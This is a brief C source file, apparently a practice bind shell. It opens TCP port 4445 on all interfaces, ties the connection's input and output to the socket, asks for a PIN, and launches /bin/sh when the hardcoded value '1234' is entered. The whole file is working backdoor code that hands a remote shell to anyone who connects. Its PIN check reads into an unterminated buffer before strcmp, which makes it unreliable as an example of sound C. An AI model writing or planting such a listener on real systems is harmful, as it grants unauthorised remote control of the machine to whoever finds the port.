#include <stdio.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <sys/types.h>
#include <unistd.h>
#include <string.h>

int main()
{
	int sockfd;
	int newsockfd;
	int ret = 0;  
	char buf[4];  // to hold the value user entered as PIN
	unsigned short port = 4445;
	struct sockaddr_in client;

	struct sockaddr_in server;
	server.sin_family = AF_INET;
	server.sin_port = htons(port);
	server.sin_addr.s_addr = INADDR_ANY;
	bzero(&server.sin_zero, 8);

	//length of a structure in bytes
	int sockaddr_len = sizeof(struct sockaddr_in);
	//execve 2nd and 3rd argument
	char *const argv[] = {"/bin/sh", NULL};
	char *const envp[] = {NULL};


	//create a new socket
	sockfd = socket(AF_INET, SOCK_STREAM, 0);

	//bind a name to a socket
	bind(sockfd, (struct sockaddr *)&server, sockaddr_len);

	//listen for connections on a socket
	listen(sockfd,0);

	//accept a connection on a socket
	newsockfd = accept(sockfd, (struct sockaddr *)&client, &sockaddr_len);

	//close old fd
	close(sockfd);

	//duplicate fd-s for newsockfd
	dup2(newsockfd,0);
	dup2(newsockfd,1);
	dup2(newsockfd,2);

	//write
	write(newsockfd, "Enter PIN:\n", 11);
	read(newsockfd, &buf ,4);
	ret = strcmp("1234", buf);

	if(ret == 0)
	{
		execve("/bin/sh", argv ,envp);
	}

}
